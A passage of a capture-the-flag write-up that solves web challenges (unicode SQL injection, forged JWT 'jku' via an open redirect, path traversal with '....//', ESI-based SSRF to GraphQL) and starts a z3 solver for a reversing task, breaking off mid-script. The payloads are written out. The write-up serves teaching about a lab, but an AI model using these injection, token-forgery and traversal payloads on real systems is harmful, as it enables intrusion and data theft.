<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="html"><code><span class="line"><span style="color:#758575DD">&#x3C;!-- TODO: review all the /secret notes and make them accessible. See: https://pastebin.com/TJMXHEB9 --></span></span>
<span class="line"></span></code></pre>
<p>We can access to the pastebin code but if we try with:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>note=/secret/flag.txt</span></span>
<span class="line"><span></span></span></code></pre>
<p>And get the flag!</p>
</li>
</ol>
<h3 id="web-200">Web 200</h3>
<p>This challenge is a webpage with a search box for emojis. We can immediately see from the <code>message.txt</code> file that there is a sqlite db on the backend side.</p>
<p>Inspecting further the code snippet contained in the message we can see that there is a custom sql escape done before a unicode normalization, this means that we can send a query written in unicode characters and this query would be normalized to the ascii version bypassing the filter. We used a unicode fullwidth converter to write the queries in unicode.</p>
<p>So, we sent a query to list the sqlite tables and columns:</p>
<p><code>＇    ｕｎｉｏｎ ＳＥＬＥＣＴ ＇ｐｒｅｆｉｘ＇，90，＇ｐｒｅｆｉｘ＇，name ｆｒｏｍ  ｓｑｌｉｔｅ＿ｓｃｈｅｍａ   －－</code></p>
<p><code>＇    ｕｎｉｏｎ ＳＥＬＥＣＴ ＇ｐｒｅｆｉｘ＇，90，＇ｐｒｅｆｉｘ＇，name ｆｒｏｍ ｐｒａｇｍａ＿ｔａｂｌｅ＿ｉｎｆｏ（＇ｒ３ｐｌｙｃｈ４ｌｌ３ｎｇ３ｆｌ４ｇ＇）  －－</code></p>
<p>After that we could create the query that would print us the flag:</p>
<p><code>＇    ｕｎｉｏｎ ＳＥＬＥＣＴ ＇ｐｒｅｆｉｘ＇，90，＇ｐｒｅｆｉｘ＇，    value ｆｒｏｍ r3plych4ll3ng3fl4g  －－</code></p>
<p><code>{FLG:O0O0OP5_1_H4V3_B33N_PWN3D_(54DF4C3)!}</code></p>
<h3 id="web-300">Web 300</h3>
<p>We are presented with a sock shop, with six clickable products, each one with a dedicated page but without meaningful interactions.
The navbar presents “Login”, “Register” and “About Us” links; register does only redirect on the homepage, while login presents the login form (with which we cannot login, since we cannot register).</p>
<p>The about us page allow us to discover that there are two founders (@gigi and @tony1987) which are presumably admin accounts. There is also a open position for a developer.</p>
<p>The developer position has a clickable card that follows the link</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="html"><code><span class="line"><span style="color:#DBD7CAEE">/24bfaaddbd56755e48876b92144c1be38d56de29/open_position?position=developer</span></span>
<span class="line"></span></code></pre>
<p>Which we found to be an <code>open redirection</code> and changing <code>developer</code> to an external URL, we are effectively redirected to the website</p>
<p>e.g.
<code>/24bfaaddbd56755e48876b92144c1be38d56de29/open_position?position=https://www.google.com</code> redirects us on google homepage.</p>
<p>We found that the website sets a cookie <code>access_token_cookie</code> which is a JWT for the current user session</p>
<p>Analyzing it on jwt.io:</p>
<p>![]({{ site.baseurl }}/writeup_files/reply2022/images/QSjJVDR.png)</p>
<p>we can see that the websites exposes at the <code>/jwks</code> endpoint the public key related to the private key used to sign the certificates.</p>
<p>we can also see that we are logged in as an <code>anonymous</code> user.</p>
<p>This suggested us that we could use the open redirection to modify the jwt in order to show an handcrafted <code>jku</code>, pointing at a public key generated by us, thus allowing us to sign the certificates with our private key.</p>
<p>We then tried to locally host a public key and tried to make the website reach for it by setting up a public ip with <code>ngrok</code>. Since no requests passed through, we discovered that external URLs where filtered.</p>
<p>e.g.</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>jwtHeader = {</span></span>
<span class="line"><span>...jwtHeader,</span></span>
<span class="line"><span>"jku": "127.0.0.1:5000/24bfaaddbd56755e48876b92144c1be38d56de29/open_position?position=NGROK_URL"</span></span>
<span class="line"><span>}</span></span>
<span class="line"><span></span></span></code></pre>
<p>By looking up the request at the open redirection link, we found a custom HTTP Header</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>ReplyFW-ALLOWED-INTERNET: https://gist.githubusercontent.com</span></span>
<span class="line"><span></span></span></code></pre>
<p>Which hinted that we could reach content hosted on GitHub gists. We then proceeded to host our public key on gist and were able to correctly sign JWTs.</p>
<p>By looking at the About Us page, we guessed that the admin could be one of the two listed users, so we tried to change <code>"sub": "anonymous"</code> in the jwt to <code>"sub": "gigi"</code>, since it was listed as ‘Sys Admin’.</p>
<p>The website correctly accepted our JWT and we were identified as admin.</p>
<p>![]({{ site.baseurl }}/writeup_files/reply2022/images/dDXbVpp.png)</p>
<p>The admin page then asked us for a verification code.</p>
<p>![]({{ site.baseurl }}/writeup_files/reply2022/images/ORS4dgS.png)</p>
<p>Analyzing the link <code>http://gamebox1.reply.it/24bfaaddbd56755e48876b92144c1be38d56de29/verify_registered?key=4c012936c5246171bfa1908f81a5eead</code></p>
<p>we discovered that the key query value <code>4c012936c5246171bfa1908f81a5eead</code>  was and md5 of an username (<code>mike1991</code>)</p>
<p>![]({{ site.baseurl }}/writeup_files/reply2022/images/NekBLtL.png)</p>
<p>So we could try to use the username of the admin to obtain the correct key. Trying with the md5 of <code>gigi</code> yielded no results, so we tried to guess from <code>mike1991</code> that we needed the birthyear of the admin.</p>
<p>By going back on the About Us page, it is mentioned that @tony1987 and @gigi are twins, so the year must be the same.</p>
<p>![]({{ site.baseurl }}/writeup_files/reply2022/images/ifmuV3e.png)</p>
<p>Then by visiting</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>http://gamebox1.reply.it/24bfaaddbd56755e48876b92144c1be38d56de29/verify_registered?key=55060d3ca52960cb070c5692a0cc814e</span></span>
<span class="line"><span></span></span></code></pre>
<p>We could obtain our verification code
![]({{ site.baseurl }}/writeup_files/reply2022/images/EF4n5Lm.png)</p>
<p>Which made us reach the admin page with a verified account</p>
<p>![]({{ site.baseurl }}/writeup_files/reply2022/images/O8FKnny.png)</p>
<p>Each text input field made a POST request when clicking on <code>Update</code> to</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>http://gamebox1.reply.it/24bfaaddbd56755e48876b92144c1be38d56de29/f1103cad4b0542c69e23b267e173799295c4f217</span></span>
<span class="line"><span></span></span></code></pre>
<p>But that did not seem to change anything on the page or give interesting responses, whichever input we gave it.</p>
<p>On the other hand, the <code>Download report</code> button downloaded the file <code>22-10-orders.txt</code> with the content</p>
<p><code>No orders yet :'(</code></p>
<p>The name of the file is specified in the POST request data</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="json"><code><span class="line"><span style="color:#666666">{</span></span>
<span class="line"><span style="color:#B8A96577">"</span><span style="color:#B8A965">report</span><span style="color:#B8A96577">"</span><span style="color:#666666">:</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">22-10-orders.txt</span><span style="color:#C98A7D77">"</span></span>
<span class="line"><span style="color:#666666">}</span></span>
<span class="line"></span></code></pre>
<p>by changing the file name we were presented an error if the file was not present on the server (for example flag.txt)</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>Unexpected error: the file does not exist or you do not have permissions to read it: </span></span>
<span class="line"><span>/home/web3/reports/flag.txt</span></span>
<span class="line"><span></span></span></code></pre>
<p>so we could then discover that we were in the folder <code>reports</code> in the home directory of the user <code>web3</code>.</p>
<p>We then tried to see if we had access to path traversal, but using a filename such as <code>../flag.txt</code>; we saw that the <code>../</code> were escaped/filtered in the response.</p>
<p>By applying a simple anti-filtering technique we could have access to path traversal with <code>....//</code></p>
<p>With the payload</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>{</span></span>
<span class="line"><span>"report": "....//flag.txt"</span></span>
<span class="line"><span>}</span></span>
<span class="line"><span></span></span></code></pre>
<p>the output was finally</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>Unexpected error: the file does not exist or you do not have permissions to read it: </span></span>
<span class="line"><span>/home/web3/reports/../flag.txt</span></span>
<span class="line"><span></span></span></code></pre>
<p>But we still had no access to the file or it was not present on the server.</p>
<p>We then tried all common files present on a linux home folder, and we discovered the presence of the <code>.bash_history</code> file.</p>
<p>As a response we got
![]({{ site.baseurl }}/writeup_files/reply2022/images/BIJikZC.png)</p>
<p>and in particular we discovered the presence of <code>/home/web3/scripts/run_webapp.sh</code></p>
<p>And with the final payload</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>{</span></span>
<span class="line"><span>"report": "....//scripts/run_webapp.sh"</span></span>
<span class="line"><span>}</span></span>
<span class="line"><span></span></span></code></pre>
<p>we got the response
<code>python /bin/webapp/app.py -f {FLG:Le4ve_my_S0cks_4l0ne}</code></p>
<h3 id="web-400">Web 400</h3>
<p>We’re presented with a simple website with a news tab containg some informations regarding a possible <code>Edge-Side-Includes</code> implementation inside the server.</p>
<p>Further investigating the functionalities of the webpage we find a contact page that renders an ESI payload inside the contact request body.
Sending as payload <code>&#x3C;esi:include src="http://example.com/"></code> gives us <code>&#x3C;esi:error hidden="">Hostname or port not in whitelist. Hosts allowed: ['172.20.0.4']; Ports allowed: [5000].&#x3C;/esi:error></code> as rendered body.
So we start digging inside this internal network endpoint, and we could easily find some useful informations inside the robots.txt file:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>User-agent: *</span></span>
<span class="line"><span>Disallow: /graphql</span></span>
<span class="line"><span>Disallow: /test</span></span>
<span class="line"><span></span></span></code></pre>
<p>Inside /test we could see a message:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>This is a test page I made to check if the Authorization header has been correctly added to the requests coming from the ESI server.</span></span>
<span class="line"><span></span></span>
<span class="line"><span>If you see your username below, then this request was correctly authenticated and your ESI server can successfully communicate with this machine and its services (e.g., graphql).</span></span>
<span class="line"><span></span></span>
<span class="line"><span>Username: esi-user</span></span>
<span class="line"><span></span></span>
<span class="line"><span>To other developers on the team: recall that we also have an ESI tag that can access values of specific request headers (esi:header).</span></span>
<span class="line"><span></span></span></code></pre>
<p>Trough this endpoint we could see that using
<code>&#x3C;esi:header name="Authorization"></code> we would get as a response our Authorization header that we added to the outside request.
We also found out that if we didn’t send any Auth header a default one would be added:
<code>ZXNpLXVzZXI=:MTY2NTQ4MDYzMQ==</code>
which decoded is esi-user:1665480631.
With the password being souspiciously similar to a timestamp.</p>
<p>Next we started quering the graphql endpoint, trough simple requests we could get the objects declared in the environment:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>{"data":{"__schema":{"types":[{"name":"User"},{"name":"ID"},{"name":"String"},{"name":"UserExtended"},{"name":"Boolean"},{"name":"UsersResult"},{"name":"UserResult"},{"name":"FlagResult"},{"name":"Query"},{"name":"__Schema"},{"name":"__Type"},{"name":"__TypeKind"},{"name":"__Field"},{"name":"__InputValue"},{"name":"__EnumValue"},{"name":"__Directive"},{"name":"__DirectiveLocation"}]}}}</span></span>
<span class="line"><span></span></span></code></pre>
<p>After that we inspected the Flagresult object:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="json"><code><span class="line"><span style="color:#666666">{</span><span style="color:#B8A96577">"</span><span style="color:#B8A965">data</span><span style="color:#B8A96577">"</span><span style="color:#666666">:{</span><span style="color:#B8A96577">"</span><span style="color:#B8A965">__type</span><span style="color:#B8A96577">"</span><span style="color:#666666">:{</span><span style="color:#B8A96577">"</span><span style="color:#B8A965">fields</span><span style="color:#B8A96577">"</span><span style="color:#666666">:[{</span><span style="color:#B8A96577">"</span><span style="color:#B8A965">name</span><span style="color:#B8A96577">"</span><span style="color:#666666">:</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">success</span><span style="color:#C98A7D77">"</span><span style="color:#666666">},{</span><span style="color:#B8A96577">"</span><span style="color:#B8A965">name</span><span style="color:#B8A96577">"</span><span style="color:#666666">:</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">errors</span><span style="color:#C98A7D77">"</span><span style="color:#666666">},{</span><span style="color:#B8A96577">"</span><span style="color:#B8A965">name</span><span style="color:#B8A96577">"</span><span style="color:#666666">:</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">flag</span><span style="color:#C98A7D77">"</span><span style="color:#666666">}</span></span>
<span class="line"></span></code></pre>
<p>So we started querying for this object but we couldn’t get the flag and printing the errors attribute we get:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="json"><code><span class="line"><span style="color:#666666">{</span><span style="color:#B8A96577">"</span><span style="color:#B8A965">data</span><span style="color:#B8A96577">"</span><span style="color:#666666">:{</span><span style="color:#B8A96577">"</span><span style="color:#B8A965">flag</span><span style="color:#B8A96577">"</span><span style="color:#666666">:{</span><span style="color:#B8A96577">"</span><span style="color:#B8A965">errors</span><span style="color:#B8A96577">"</span><span style="color:#666666">:[</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Only user 'admin' can perform this operation.</span><span style="color:#C98A7D77">"</span><span style="color:#666666">]}}}</span><span style="color:#DBD7CAEE"> </span></span>
<span class="line"></span></code></pre>
<p>So we need to login as admin to get this flag. Upon searching a little deeper in to the graphql environment we find that a type User includes a last login timestamp. So we tried getting the flag using the admin last login timestamp as a password.</p>
<p>We added the Authorization header: <code>Authorization: YWRtaW4=:MTY2NTY0OTUxMQ==</code></p>
<p>And we could successfully get the flag trough the simple graphql query:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="html"><code><span class="line"><span style="color:#666666">&#x3C;</span><span style="color:#FDAEB7">esi:include</span><span style="color:#BD976A"> src</span><span style="color:#666666">=</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">http://172.20.0.4:5000/graphql?query={flag{flag}}</span><span style="color:#C98A7D77">"</span><span style="color:#666666">></span></span>
<span class="line"></span></code></pre>
<p>Response:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="json"><code><span class="line"><span style="color:#666666">{</span><span style="color:#B8A96577">"</span><span style="color:#B8A965">data</span><span style="color:#B8A96577">"</span><span style="color:#666666">:{</span><span style="color:#B8A96577">"</span><span style="color:#B8A965">flag</span><span style="color:#B8A96577">"</span><span style="color:#666666">:{</span><span style="color:#B8A96577">"</span><span style="color:#B8A965">flag</span><span style="color:#B8A96577">"</span><span style="color:#666666">:</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">{FLG:XSS_4nd_SSRF_f0rb1dd3n_ch1ld}</span><span style="color:#C98A7D77">"</span><span style="color:#666666">}}}</span></span>
<span class="line"></span></code></pre>
<h2 id="binary-45">Binary (4/5)</h2>
<h3 id="binary-100">Binary 100</h3>
<p>This was a reverse challenge.
The provided file is a 64-bit ELF that asks to find the right word (and prints Wesley the cat). Trying to insert a random word, the binary returns an error on the word length and terminates. Using ghidra and IDA to decompile the binary, it is evident from the main how the required length is 24. Trying to insert a 24 length word, the returned error changes.
Now we have to understand which word the binary expects to receive. From the decompiled code we can see 24 different checks on each character of the input. Each of them considers the chars as numbers (double) and performs some mathematical operations. At the end, we just need to solve an algebraic system and then convert the results into printable characters. We wrote a z3 script to do it.</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#DBD7CAEE">buf_d </span><span style="color:#666666">=</span><span style="color:#666666"> [</span><span style="color:#DBD7CAEE">z3</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">Real</span><span style="color:#666666">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"</span><span style="color:#C99076">{</span><span style="color:#DBD7CAEE">i</span><span style="color:#CB7676">:02</span><span style="color:#C99076">}</span><span style="color:#C98A7D">"</span><span style="color:#666666">)</span><span style="color:#4D9375"> for</span><span style="color:#DBD7CAEE"> i </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#666666">(</span><span style="color:#4C9A91">24</span><span style="color:#666666">)]</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">solver </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> z3</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">Solver</span><span style="color:#666666">()</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">solver</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">add </span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">buf_d</span><span style="color:#666666">[</span><span style="color:#4C9A91">15</span><span style="color:#666666">]</span><span style="color:#CB7676"> ==</span><span style="color:#4C9A91"> 91.0</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">solver</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">add </span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">buf_d</span><span style="color:#666666">[</span><span style="color:#4C9A91">18</span><span style="color:#666666">]</span><span style="color:#CB7676"> ==</span><span style="color:#4C9A91"> 91.0</span><span style="color:#666666">)</span><span style="color:#DBD7CAEE"> </span></span>
<span class="line"><span style="color:#DBD7CAEE">solver</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">add </span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">buf_d</span><span style="color:#666666">[</span><span style="color:#4C9A91">0</span><span style="color:#666666">]</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> buf_d</span><span style="color:#666666">[</span><span style="color:#4C9A91">0</span><span style="color:#666666">]</span><span style="color:#CB7676"> +</span><span style="color:#4C9A91"> 11.0</span><span style="color:#CB7676"> ==</span><span style="color:#DBD7CAEE"> buf_d</span><span style="color:#666666">[</span><span style="color:#4C9A91">0</span><span style="color:#666666">]</span><span style="color:#CB7676"> +</span><span style="color:#4C9A91"> 130.0</span><span style="color:#666666">)</span><span style="color:#DBD7CAEE"> </span></span>
<span class="line"><span style="color:#DBD7CAEE">solver</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">add </span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">buf_d</span><span style="color:#666666">[</span><span style="color:#4C9A91">23</span><span style="color:#666666">]</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> buf_d</span><span style="color:#666666">[</span><span style="color:#4C9A91">23</span><span style="color:#666666">]</span><span style="color:#CB7676"> +</span><span style="color:#4C9A91"> 6.0</span><span style="color:#CB7676"> ==</span><span style="color:#DBD7CAEE"> buf_d</span><span style="color:#666666">[</span><span style="color:#4C9A91">23</span><span style="color:#666666">]</span><span style="color:#CB7676"> +</span><span style="color:#4C9A91"> 127.0</span><span style="color:#666666">)</span><span style="color:#DBD7CAEE"> </span></span>
<span class="line"><span style="color:#DBD7CAEE">solver</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">add </span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">buf_d</span><span style="color:#666666">[</span><span style="color:#4C9A91">1</span><span style="color:#666666">]</span><span style="color:#CB7676"> *</span><span style="color:#4C9A91"> 7.0</span><span style="color:#CB7676"> ==</span><span style="color:#DBD7CAEE"> buf_d</span><span style="color:#666666">[</span><span style="color:#4C9A91">1</span><span style="color:#666666">]</span><span style="color:#CB7676"> +</span><span style="color:#4C9A91"> 396.0</span><span style="color:#666666">)</span><span style="color:#DBD7CAEE"> </span></span>
<span class="line"><span style="color:#DBD7CAEE">solver</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">add </span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">buf_d</span><span style="color:#666666">[</span><span style="color:#4C9A91">22</span><span style="color:#666666">]</span><span style="color:#CB7676"> ==</span><span style="color:#4C9A91"> 104.0</span><span style="color:#666666">)</span><span style="color:#DBD7CAEE"> </span></span>
<span class="line"><span style="color:#DBD7CAEE">solver</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">add </span><span style="color:#666666">((</span><span style="color:#DBD7CAEE">buf_d</span><span style="color:#666666">[</span><span style="color:#4C9A91">2</span><span style="color:#666666">]</span><span style="color:#CB7676"> +</span><span style="color:#4C9A91"> 2.0</span><span style="color:#666666">)</span><span style="color:#CB7676"> *</span><span style="color:#4C9A91"> 3.0</span><span style="color:#CB7676"> -</span><span style="color:#4C9A91"> 2.0</span><span style="color:#CB7676"> ==</span><span style="color:#666666"> (</span><span style="color:#DBD7CAEE">buf_d</span><span style="color:#666666">[</span><span style="color:#4C9A91">2</span><span style="color:#666666">]</span><span style="color:#CB7676"> -</span><span style="color:#4C9A91"> 17.0</span><span style="color:#666666">)</span><span style="color:#CB7676"> *</span><span style="color:#4C9A91"> 4.0</span><span style="color:#666666">)</span><span style="color:#DBD7CAEE"> </span></span>
<span class="line"><span style="color:#DBD7CAEE">solver</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">add </span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">buf_d</span><span style="color:#666666">[</span><span style="color:#4C9A91">21</span><span style="color:#666666">]</span><span style="color:#CB7676"> ==</span><span style="color:#666666"> (</span><span style="color:#DBD7CAEE">buf_d</span><span style="color:#666666">[</span><span style="color:#4C9A91">21</span><span style="color:#666666">]</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> buf_d</span><span style="color:#666666">[</span><span style="color:#4C9A91">21</span><span style="color:#666666">])</span><span style="color:#CB7676"> -</span><span style="color:#4C9A91"> 44.0</span><span style="color:#666666">)</span><span style="color:#DBD7CAEE"> </span></span>
<span class="line"><span style="color:#DBD7CAEE">solver</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">add </span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">buf_d</span><span style="color:#666666">[</span><span style="color:#4C9A91">3</span><span style="color:#666666">]</span><span style="color:#CB7676"> ==</span><span style="color:#4C9A91"> 67.0</span><span style="color:#666666">)</span><span style="color:#DBD7CAEE"> </span></span>
<span class="line"><span style="color:#DBD7CAEE">solver</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">add </span><span style="color:#666666">((</span><span style="color:#DBD7CAEE">buf_d</span><span style="color:#666666">[</span><span style="color:#4C9A91">20</span><span style="color:#666666">]</span><span style="color:#CB7676"> *</span><span style="color:#4C9A91"> 3.0</span><span style="color:#CB7676"> -</span><span style="color:#4C9A91"> 2.0</span><span style="color:#666666">)</span><span style="color:#CB7676"> *</span><span style="color:#4C9A91"> 3.0</span><span style="color:#CB7676"> -</span><span style="color:#666666"> (</span><span style="color:#DBD7CAEE">buf_d</span><span style="color:#666666">[</span><span style="color:#4C9A91">20</span><span style="color:#666666">]</span><span style="color:#CB7676"> *</span><span style="color:#4C9A91"> 5.0</span><span style="color:#CB7676"> +</span><span style="color:#4C9A91"> 2.0</span><span style="color:#666666">)</span><span style="color:#CB7676"> *</span><span style="color:#4C9A91"> 4.0</span><span style="color:#CB7676"> ==</span><span style="color:#DBD7CAEE">buf_d</span><span style="color:#666666">[</span><span style="color:#4C9A91">20</span><span style="color:#666666">]</span><span style="color:#CB7676"> *</span><span style="color:#CB7676"> -</span><span style="color:#4C9A91">8.0</span><span style="color:#CB7676"> -</span><span style="color:#4C9A91"> 146.0</span><span style="color:#666666">)</span><span style="color:#DBD7CAEE"> </span></span>
<span class="line"><span style="color:#DBD7CAEE">solver</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">add </span><span style="color:#666666">((</span><span style="color:#DBD7CAEE">buf_d</span><span style="color:#666666">[</span><span style="color:#4C9A91">4</span><span style="color:#666666">]</span><span style="color:#CB7676"> *</span><span style="color:#4C9A91"> 5.0</span><span style="color:#CB7676"> -</span><span style="color:#4C9A91"> 2.0</span><span style="color:#666666">)</span><span style="color:#CB7676"> *</span><span style="color:#4C9A91"> 5.0</span><span style="color:#CB7676"> -</span><span style="color:#666666"> (</span><span style="color:#DBD7CAEE">buf_d</span><span style="color:#666666">[</span><span style="color:#4C9A91">4</span><span style="color:#666666">]</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> buf_d</span><span style="color:#666666">[</span><span style="color:#4C9A91">4</span><span style="color:#666666">]</span><span style="color:#CB7676"> +</span><span style="color:#4C9A91"> 7.0</span><span style="color:#666666">)</span><span style="color:#CB7676"> *</span><span style="color:#4C9A91"> 6.0</span><span style="color:#CB7676"> ==</span><span style="color:#DBD7CAEE">buf_d</span><span style="color:#666666">[</span><span style="color:#4C9A91">4</span><span style="color:#666666">]</span><span style="color:#CB7676"> *</span><span style="color:#4C9A91"> 33.0</span><span style="color:#CB7676"> -</span><span style="color:#4C9A91"> 1132.0</span><span style="color:#666666">)</span><span style="color:#DBD7CAEE"> </span></span>
<span class="line"><span style="color:#DBD7CAEE">solver</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">add </span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">buf_d</span><span style="color:#666666">[</span><span style="color:#4C9A91">19</span><span style="color:#666666">]</span><span style="color:#CB7676"> ==</span><span style="color:#666666"> (</span><span style="color:#DBD7CAEE">buf_d</span><span style="color:#666666">[</span><span style="color:#4C9A91">3</span><span style="color:#666666">]</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> buf_d</span><span style="color:#666666">[</span><span style="color:#4C9A91">20</span><span style="color:#666666">])</span><span style="color:#CB7676"> -</span><span style="color:#4C9A91"> 16.0</span><span style="color:#666666">)</span><span style="color:#DBD7CAEE"> </span></span>
<span class="line"><span style="color:#DBD7CAEE">solver</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">add </span><span style="color:#666666">((</span><span style="color:#DBD7CAEE">buf_d</span><span style="color:#666666">[</span><span style="color:#4C9A91">5</span><span style="color:#666666">]</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> buf_d</span><span style="color:#666666">[</span><span style="color:#4C9A91">5</span><span style="color:#666666">])</span><span style="color:#CB7676"> /</span><span style="color:#4C9A91"> 3.0</span><span style="color:#CB7676"> ==</span><span style="color:#666666"> (</span><span style="color:#DBD7CAEE">buf_d</span><span style="color:#666666">[</span><span style="color:#4C9A91">5</span><span style="color:#666666">]</span><span style="color:#CB7676"> +</span><span style="color:#4C9A91"> 44.0</span><span style="color:#666666">)</span><span style="color:#CB7676"> /</span><span style="color:#4C9A91"> 3.0</span><span style="color:#666666">)</span><span style="color:#DBD7CAEE"> </span></span>
<span class="line"><span style="color:#DBD7CAEE">solver</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">add </span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">buf_d</span><span style="color:#666666">[</span><span style="color:#4C9A91">17</span><span style="color:#666666">]</span><span style="color:#CB7676"> ==</span><span style="color:#4C9A91"> 49.0</span><span style="color:#666666">)</span><span style="color:#DBD7CAEE"> </span></span>
<span class="line"><span style="color:#DBD7CAEE">solver</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">add </span><span style="color:#666666">((</span><span style="color:#DBD7CAEE">buf_d</span><span style="color:#666666">[</span><span style="color:#4C9A91">6</span><span style="color:#666666">]</span><span style="color:#CB7676"> *</span><span style="color:#4C9A91"> 8.0</span><span style="color:#CB7676"> +</span><span style="color:#4C9A91"> 15.0</span><span style="color:#666666">)</span><span style="color:#CB7676"> *</span><span style="color:#4C9A91"> 0.1666666666666667</span><span style="color:#CB7676"> ==</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">buf_d</span><span style="color:#666666">[</span><span style="color:#4C9A91">6</span><span style="color:#666666">]</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> buf_d</span><span style="color:#666666">[</span><span style="color:#4C9A91">6</span><span style="color:#666666">]</span><span style="color:#CB7676"> +</span><span style="color:#4C9A91"> 81.0</span><span style="color:#666666">)</span><span style="color:#CB7676"> *</span><span style="color:#4C9A91"> 0.5</span><span style="color:#666666">)</span><span style="color:#DBD7CAEE"> </span></span>
<span class="line"><span style="color:#DBD7CAEE">solver</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">add </span><span style="color:#666666">(</span><span style="color:#4C9A91">0.0</span><span style="color:#CB7676"> -</span><span style="color:#DBD7CAEE"> buf_d</span><span style="color:#666666">[</span><span style="color:#4C9A91">16</span><span style="color:#666666">]</span><span style="color:#CB7676"> /</span><span style="color:#4C9A91"> 5.0</span><span style="color:#CB7676"> ==</span><span style="color:#4C9A91"> 36.0</span><span style="color:#CB7676"> -</span><span style="color:#DBD7CAEE"> buf_d</span><span style="color:#666666">[</span><span style="color:#4C9A91">16</span><span style="color:#666666">])</span><span style="color:#DBD7CAEE"> </span></span>
